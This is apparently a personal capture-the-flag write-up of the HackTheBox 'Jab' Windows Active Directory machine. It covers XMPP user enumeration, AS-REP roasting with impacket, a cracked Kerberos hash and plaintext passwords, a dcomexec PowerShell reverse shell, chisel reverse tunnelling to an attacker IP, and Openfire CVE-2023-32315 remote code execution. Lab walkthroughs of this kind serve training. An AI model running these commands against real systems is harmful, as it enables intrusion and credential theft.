# Jab -htb(Compi)


Windows box

Nmap scan reveals that it is an AD machine

`port 53, LDAP, port 5222 (jabber)`--> name of the box ---> this shud be interesting.

port 7070 ---> leads to a site

domain name DC.jab.htb jab.htb
add them to hosts file

When its AD, we gotta enumerate Usernames , you know the drill.
	lots of usernames , keeps on going.

This is about XMPP ----> instant messagging ----> a client called `pidgin` is used to connect.

So this took me a while to get hang of it . Open pidgin kali, and then register as a new user.
Remember to use the `jab.htb` as the Domain name or it will not connect.

Then inside of pidgin after creating a user and logging in, go to plugins and select `service discovery`. It will enumerate other chatrooms /domains etc .

---
Then you will find test2 , join the chatroom.
You will find a user `bdavis` xss the chat room lol
`(11/21/2023 01:49:50 PM) bdavis: <img src="data:image/png;base64,VGhlIGltYWdlIGRhdGEgZ29lcyBoZXJlCg==" alt="some text" />`

hmm

There is a cve that does the exact same thing : https://github.com/theart42/cves/blob/master/cve-2020-12772/pictures/responder.png 
maybe i do it too ?

It didnt work

----

When discovering for services , i found `search.jab.htb`,  then when i went into accounts --> myaccount ---> search for user , i found a massive list of users . Now i need to export this list somehow so that i can furtuer run kerbrute.

the burp proxy thing , i coulndt figure it out so i did this to export the users list:

	start pidgin like this : `pidgin -d > output.log`
	then go to accoutss and search users. After searching you will get the users in output log.

Now to filter out from that list, only username , do this :
`grep -oP '<value>\K[^<]+@jab.htb(?=</value>)' output.log | sed 's/@jab.htb//g' | sort | uniq > output_filtered.lst`

After that we need to do `AS-REP Roastable` attack:
`impacket-GetNPUsers jab.htb/ -usersfile output_filtered.lst -outputfile outputusers.txt -dc-ip 10.10.11.4 -no-pass`

We will get some hashes , then crack them using hashcat
`$krb5asrep$23$jmontgomery@JAB.HTB:969e83d52a785c0d86dffa3f3dd3a836$20674d8fe93b775b769c101c008568b9e8f431b8bfc6c9aaa673201d452f7b2c323af7f7b966056fa582967923c7241ca7656abe366f2f625d1a8103b2f7025363bec29fd11cc1a5d422bf02347276f5cb8a73384f8b5185ebea76ab52ea5ab249819391b3f5a125d1110d3f223551bdf934bd74788e5cc83082f4f730ecda0dcbc375530afb33dc322775102cf48d0d5c774121b9e0bb0dd58cf1a9b202afd9551fd96ee04f5dcab8b3684ac13be43c3fd06d953f94b73d54a60386acff75a49ca694c8fec3fb760423927943c99eb2fff940ce17bae7f90c5c7510d2f28c34ea1f`
: Midnight_121

So only `jmontgomery@JAB.HTB`'s hash worked 

Now we have to use this cred in pidgin, add user there and login with pass.
Then go to service discovery plugin and search for services with your new account, will find a new chat room, go there and grab `svc_openfire` user hash. Crack it. 
Oh wait, no need to crack it , read the texts , the hash is already cracked.lol


svc_openfire  :  `!@#$%^&*(1qazxsw`

Where do i use this ?

after trying other options so much , i found 
`runas` in Windows . I can use this command to run as `svc_openfire` wtf
https://book.hacktricks.xyz/windows-hardening/lateral-movement/dcom-exec

After countless fails and going thru this exploit, trying to figure out how to get a rev shell, almost took the day.
This is how it worked:

	`runas` didnt work so forget about it.
	`dcomexec.py` i downloaded and ran using python3 , then ran this command:
		`python3 dcomexec.py -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 '<base64Powershellrevshell>' -silentcommand

Finally got a connection back and got User flag!



---

Shell as SVC_openfire (ROAD to PRIV ESC):
--


port forward to access OpenFire dashboard

`./chisel.exe client 10.10.14.8:8051 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091` on target machine

on kali:  ./chisel server -p 8051 --reverse

now on kali access the dashboard with port localhost:9090

Now google the OpenFire cve and use that to exploit.

But wait, we already have the OpenFire creds. Use svc_openfire creds theysame.

---

OpenFire DashBoard ENUM:
--

Since we have an OpenFire account, we can directly skip to uploading a malicisous .jar file 
https://vulncheck.com/blog/openfire-cve-2023-32315

By following this cve and using the management-tool-commnads :
	i was able to RCE , but thru that tool, i couldnt do much , only "whoami" worked. and if i tried to run any commands like dir,ls etc it would give "bad command" error . so annoyinng.
	
So i opened  a rev shell again from that shell.
	
`cmd.exe /c powershell -e [revshell in base64]`

and got root flag.
